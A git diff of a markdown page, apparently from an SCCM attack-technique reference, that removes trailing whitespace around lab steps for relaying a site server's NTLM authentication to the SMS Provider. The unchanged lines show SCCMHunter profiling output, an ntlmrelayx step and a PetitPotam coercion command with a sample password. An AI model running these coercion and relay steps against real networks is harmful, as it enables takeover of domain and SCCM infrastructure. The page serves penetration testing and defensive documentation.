@@ -49,14 +49,14 @@ This technique may allow an attacker to relay a site server domain computer acco
 1. Use `SCCMHunter` to  profile SCCM infrastructure:
 
     ```
-    [02:00:25 PM] INFO     [+] Finished profiling all discovered computers.                                   
+    [02:00:25 PM] INFO     [+] Finished profiling all discovered computers.
     [02:00:25 PM] INFO     +-------------------------+------------+-----------------+--------------+-------------------+---------------------+---------------+--------+---------+
                         | Hostname                | SiteCode   | SigningStatus   | SiteServer   | ManagementPoint   | DistributionPoint   | SMSProvider   | WSUS   | MSSQL   |
                         +=========================+============+=================+==============+===================+=====================+===============+========+=========+
                         | provider.internal.lab   | None       | False           | False        | False             | False               | True          | False  | False   |
                         +-------------------------+------------+-----------------+--------------+-------------------+---------------------+---------------+--------+---------+
                         | sccm.internal.lab       | LAB        | False           | True         | True              | False               | True          | False  | False   |
-                        +-------------------------+------------+-----------------+--------------+-------------------+---------------------+---------------+--------+---------+       
+                        +-------------------------+------------+-----------------+--------------+-------------------+---------------------+---------------+--------+---------+
     ```
 2. On the attacker relay server, start `ntlmrelayx`, targeting the SMB service remote SMS Provider identified in the previous step:
     ```
@@ -94,7 +94,7 @@ This technique may allow an attacker to relay a site server domain computer acco
 3. From the attacker host, coerce NTLM authentication from the site server targeting the relay server's IP address:
     ```
     ┌──(root㉿DEKSTOP-2QO0YEUW)-[/opt/PetitPotam]
-    └─# python3 PetitPotam.py -u lowpriv -p P@ssw0rd <NTLMRELAYX_LISTENER_IP> <SITE_SERVER_IP> 
+    └─# python3 PetitPotam.py -u lowpriv -p P@ssw0rd <NTLMRELAYX_LISTENER_IP> <SITE_SERVER_IP>
 
     Trying pipe lsarpc
     [-] Connecting to ncacn_np:passive.internal.lab[\PIPE\lsarpc]
